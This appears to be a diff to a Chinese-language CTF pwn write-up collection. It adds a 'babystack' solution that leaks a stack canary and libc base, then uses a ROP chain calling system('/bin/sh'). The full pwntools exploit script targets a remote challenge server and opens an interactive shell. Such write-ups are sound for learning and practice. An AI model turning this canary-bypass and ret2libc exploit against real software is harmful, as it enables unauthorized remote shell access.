@@ -290,7 +290,7 @@ sh: 1: : Permission denied
 ```
 
 ### 9. pwn-200
-题目：栈无。
+题目：暂无。
 
 思路：这道题目没有提供libc，需要通过远程泄露的方式查找system函数地址。
 
@@ -357,4 +357,100 @@ print(data)
 payload = makePayload32(system, bss, 1, 1, vulFun)
 sh.sendline(payload)
 sh.interactive()
+```
+
+### 10. pwn1
+题目：暂无。
+
+思路：增加了canary的栈溢出，首先使用puts泄露canary，然后利用这个值配合ROP获取flag。
+
+第一个步获取canary比较简单，主要就是将缓冲区覆盖到canary之前（还需要覆盖掉canary的第一个字节，canary设计之初为了防止泄露第一个字节为0），然后利用puts泄露出后七个字节即可。
+
+第二步是获取libc加载地址，首先需要泄露一个libc中的函数（如write）的地址，然后利用LibcSearcher找出libc的地址即可。这里有个坑，题目本身提供了libc，但是通过write函数的got地址和libc库中的地址计算出来的libc地址根本不能用，看了一个wp说是libc和服务器的libc不同，但是我getshell以后在服务器上看了大小一模一样，应该不会是假的，另外上面计算出来的结果是这种形式：7fba5f6f0030，而LibcSearcher的结果是这样的：7fba5f6f0000，其实差别并不大，每次都是相差0x30字节，因此我推测应该不是libc不同，而是libc在实际装载的时候不同页进行了某些对齐操作，而且libc的地址按道理应该是4K对齐（也就是后三位是0），因此第一个计算结果可能是错误的，这种方式可能没有考虑链接器的一些细节。
+
+第三部是通过LibcSearcher获取的libc版本计算system函数地址和/bin/sh地址，然后构造rop调用system即可。
+
+代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+sh = remote('220.249.52.133', 54007)
+elf = ELF('babystack')
+
+def getCanary():
+    sh.recvuntil('>> ')
+    sh.sendline('1')
+    sleep(1)
+    sh.sendline(b'A' * 136)
+    sh.recvuntil('>> ')
+    sh.sendline('2')
+    sh.recvuntil('\n')
+    canary = u64(b'\x00' + sh.recv(7))
+    log.success('0x%0x' % canary)
+    return canary
+
+canary = getCanary()
+
+bufLen = 0x88
+pop_rdi_ret = 0x400a93
+main = 0x400908
+
+def leak(addr):
+    payload = b'A' * bufLen
+    payload += p64(canary)
+    payload += b'B' * 8
+    payload += p64(pop_rdi_ret)
+    payload += p64(addr)
+    payload += p64(elf.plt['puts'])
+    payload += p64(main)
+    sh.recvuntil('>> ')
+    sh.sendline('1')
+    sleep(1)
+    sh.sendline(payload)
+    data = sh.recvuntil('>> ')
+    print(data)
+    sh.send('3')
+    data = sh.recv(6)
+    return u64(data + b'\x00\x00')
+ 
+ 
+writeAddr = leak(elf.got['write'])
+
+# 第一种方法计算出来的基址有问题，导致system无法执行
+# 第一种结果类似：7fba5f6f0030
+# 第二种结果类似：7fba5f6f0000
+# 明显第一种结果没有4k对齐
+# 猜测可能是装载动态库的时候不同页使用了对齐，导致第一种方式计算结果出现了偏差？？？
+libc = ELF('libc-2.23.so')
+libBase = writeAddr - libc.sym['write']
+print(libBase)
+systemAddr = libBase + libc.sym['system']
+binStrAddr = libBase + 0x18cd17
+log.info('system 0x%x' % systemAddr)
+
+# 第二种方法查找的基址可用
+libc2 = LibcSearcher('write', writeAddr)
+libBase2 = writeAddr - libc2.dump('write')
+print(libBase2)
+systemAddr = libBase2 + libc2.dump('system')
+binStrAddr = libBase2 + libc2.dump('str_bin_sh')
+
+def getShell():
+    payload = b'A' * bufLen
+    payload += p64(canary)
+    payload += b'B' * 8
+    payload += p64(pop_rdi_ret)
+    payload += p64(binStrAddr)
+    payload += p64(systemAddr)
+    payload += p64(main)
+    sh.recvuntil('>> ')
+    sh.sendline('1')
+    sleep(1)
+    sh.sendline(payload)
+    data = sh.recvuntil('>> ')
+    sh.send('3')
+    sh.interactive()
+
+getShell()
 ```
